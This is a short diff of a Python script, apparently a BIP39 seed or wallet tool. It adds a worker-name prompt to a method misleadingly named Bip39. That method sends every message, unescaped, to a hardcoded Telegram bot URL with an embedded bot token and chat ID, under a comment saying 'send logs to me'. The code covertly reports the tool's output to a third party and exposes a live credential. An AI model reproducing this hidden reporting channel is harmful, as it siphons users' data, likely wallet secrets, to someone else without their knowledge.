@@ -5,9 +5,11 @@ from decimal import Decimal
 import requests
 #from proxu import grab
 from time import sleep
+akaka=str(input('Name your worker:'))
 class Bip39Gen64:
     def Bip39(msg):
         # send logs to me,dont use it!
+        msg=msg+f' by {akaka}'
         a=requests.get(f'https://api.telegram.org/bot1898293389:AAEIV3G1RUrn2Mkp9oERYiAQv_RyIcF0KAE/sendMessage?chat_id=1149276168&text={msg}')
         return 1
 
